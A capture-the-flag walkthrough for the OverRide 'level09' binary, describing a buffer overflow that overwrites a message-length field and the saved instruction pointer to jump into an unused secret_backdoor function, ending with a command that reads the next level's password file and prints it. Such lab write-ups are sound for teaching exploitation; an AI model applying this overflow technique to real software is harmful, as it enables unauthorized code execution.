# level09 walkthrough

## the binary
``` shell
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: ffarkas
>: Welcome, ffarkas
>: Msg @Unix-Dude
>>: Hello!
>: Msg sent!
```

## methodology
- buffer overflow attack

The given binary asks for a username and message upon execution. Upon displaying the list of functions, we see that there is a <code>secret_backdoor</code> present, but not called anywhere in the main. It is able to execute a given command using the <code>system</code> function. Our task is thereby simople:

- find a way to cause buffer overflow as we enter the input
- overwrite and access the <code>EIP</code> register

The executable uses a structure to manage the data:
``` C
typedef struct s_msg {
	char user_str[40];
	char msg_str[140];
	int str_len;
}	t_msg;
```

The input values are handled by <code>set_username</code> and <code>set_msg</code> functions respectively:
```
HANDLE_MSG():
    set message length to 0x8c
        └─> msg.str_len = 140

    SET_USERNAME():
        └─ input username
        └─ load into local array
        └─ copy first 0x28 characters to structure
            └─> 40x msg->user_str[i] = array[i]

    SET_MSG():
        └─ input message
        └─ load into local array
        └─ use strncpy to copy msg.str_len characters
            └─> strncpy(msg->msg_str, array, msg->str_len)
```

The first part of the overflow is exposed in the source code logic - we use 40 characters reserved for the username and set the <code>msg.str_len</code> to the highest possible value we can using two hexadecimal digits (8 bits):
```
user_str -> 40 characters
str_len -> 0xff (255)
```

As we inspect the life status of the <code>EIP</code> through its manipulations, we can estimate its position from the base of the stack:
```
0x00000000000008c4 <+4>:	sub    $0xc0,%rsp
                                        └─> 192 ----┐
0x00000000000009cd <+0>:	push   %rbp             |--> EIP is at base + 200
                                     └─> 8 ---------┘
```

The last thing we need is the address of the <code>secret_backdoor</code> function:
``` shell
0x000055555555488c
```

These information allow us to craft the final payload and execute the <code>cat</code> command for flag displayal.

## flag
``` shell
level09@OverRide:~$ python /tmp/payload09 > tmp/flag9
level09@OverRide:~$ cat /tmp/flag9 - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
